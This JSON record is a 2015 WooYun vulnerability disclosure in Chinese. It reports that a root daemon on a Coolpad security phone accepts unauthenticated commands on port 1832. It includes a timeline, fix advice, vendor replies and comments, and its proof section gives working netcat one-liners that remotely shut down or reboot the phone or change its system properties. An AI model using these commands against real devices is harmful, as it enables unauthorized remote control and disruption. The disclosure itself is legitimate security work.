{"id": 71186, "wybug_id": "wooyun-2015-0135312", "wybug_title": "酷派安全手机远程代码执行（可远程关闭或重启手机）", "wybug_corp": "yulong.com", "wybug_author": "小荷才露尖尖角", "wybug_date": "2015-08-19 15:58", "wybug_open_date": "2015-11-22 10:56", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向公众公开  简要描述： 酷派某支持双系统隔离的安全手机，可被远程关闭或重启，并可更改系统属性 详细说明：  0x01 测试对象安全手机领袖——铂顿安全手机，手机配置如图\n\n0x02 漏洞原理具有root权限的系统daemon——/system/bin/vpowerd在任意地址的1832端口监听，可远程访问，并传入固定命令。（1）在1832端口监听adb shell查看\n\nIDA逆向查看\n\n（2）接受固定命令并执行如图，\n\n支持的通过1832端口远程传入的命令包括1.OOM_ADJ_SCORE|pid=%d：调整指定pid进程的/proc/[pid]/oom_score_adj属性为-1000（未发现有安全影响）2.INJECT_POWER_POWER_BUTTON：与用户轻按电源键等效，可远程点亮或关闭屏幕。3.DO_SHUTDOWN：关闭手机。接受该命令后，vpowerd通过system函数执行\nam start -a android.intent.ACTION_REQUEST_SHUTDOWN -n android/com.android.server.ShutdownActivity\n4.DO_REBOOT：重启手机。接受该命令后，vpowerd通过system函数执行\nam start -a android.intent.action.REBOOT -n android/com.android.server.ShutdownActivity\n5.SET_PROPERTY|%s %s：设置系统property属性值，其中第一个%s为property key，第二个%s为property value。试验发现可以更改某些系统属性，造成安全影响。   漏洞证明：  下述命令在安全手机双系统中的任何一系统中均有效。* 远程点亮或关闭屏幕\necho  -n \"INJECT_POWER_BUTTON\" | nc 192.168.8.172 1832\n使用adb logcat -s VPOWER-Daemon:V查看输出\nI/VPOWER-Daemon( 1121): POWER button successfully injected to vpower-button-vm2\n* 远程关闭、重启手机\necho  -n \"DO_SHUTDOWN\" | nc 192.168.8.172 1832\n\necho -n \"DO_REBOOT\" | nc 192.168.8.172 1832\n证明视频见http://pan.baidu.com/s/1o6BtcoU* 更改系统属性例如通过\necho  -n \"SET_PROPERTY|persist.sys.country us\" | nc 192.168.8.172 1832\n可更改系统语言为英文，重启后生效。通过\necho  -n \"SET_PROPERTY|persist.yulong.supermode 1\" | nc 192.168.8.172 1832\n可更改系统模式为“超级安全模式”，重启后生效。注意到该漏洞位于/system/bin/vpowerd，且后来发现与vpowerd通信的客户端代码属于redbend（一个移动虚拟化或BYOD解决方案提供商，见http://www.redbend.com），因此该漏洞也可能属于铂顿手机所使用的redbend虚拟化软件的漏洞，可能影响到其他基于redbend的安全手机。   修复方案：  1、vpowerd不能在任意地址监听2、在本地采用其他能够check calling uid or pid的IPC通信方式   版权声明：转载请注明来源 小荷才露尖尖角@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：4  确认时间：2015-08-24 10:54 厂商回复： 需要root，并且不影响用户数据。感谢关注酷派手机安全 最新状态： 2015-08-24：后续会添加uid验证，感谢建议。 2015-08-24：经确认，确实不需root就可操作，后续版本会修复此问题，再次感谢  ", "replys": "漏洞评价：\n评论\n     2015-08-19 16:00 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1317 漏洞数:191        | 。)\t\t \n  抢位    \n     2015-08-19 16:08 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:798 漏洞数:99        )\t\t \n  前排~    \n     2015-08-19 16:08 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:765 漏洞数:83        | 铁甲依然在)\t\t \n  么么哒    \n     2015-08-19 16:09 |    \t\ts3xy \t\t\t( 普通白帽子  |\t\t\t        Rank:855 漏洞数:114        | 相濡以沫，不如相忘于江湖)\t\t \n  mk    \n     2015-08-19 16:10 |    \t\t小荷才露尖尖角 \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:13        | less is more)\t\t \n  希望刷点分升普通    \n     2015-08-19 16:14 |    \t\t宇龙通信（酷派）(乌云厂商)\t\t \n  已和研发部门反馈此问题，感谢关注酷派手机，我们尽快检测并回复。    \n     2015-08-19 16:39 |    \t\tChora \t\t\t( 普通白帽子  |\t\t\t        Rank:337 漏洞数:22        | 生存、生活、生命。)\t\t \n  恭喜大牛升级为普通绿帽子。    \n     2015-08-19 16:55 |    \t\tQin_kinsey \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 膜拜各路大神)\t\t \n  活捉楼上一只雀儿（qioer）    \n     2015-08-19 17:08 |    \t\tPythonPig \t\t\t( 普通白帽子  |\t\t\t        Rank:506 漏洞数:72        | 只会简单工具的小小菜)\t\t \n  大牛又放大招儿了    \n     2015-08-24 11:00 |    \t\t小荷才露尖尖角 \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:13        | less is more)\t\t \n  @宇龙通信（酷派）不需要手机root啊，我测试的铂顿手机是没有root的    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}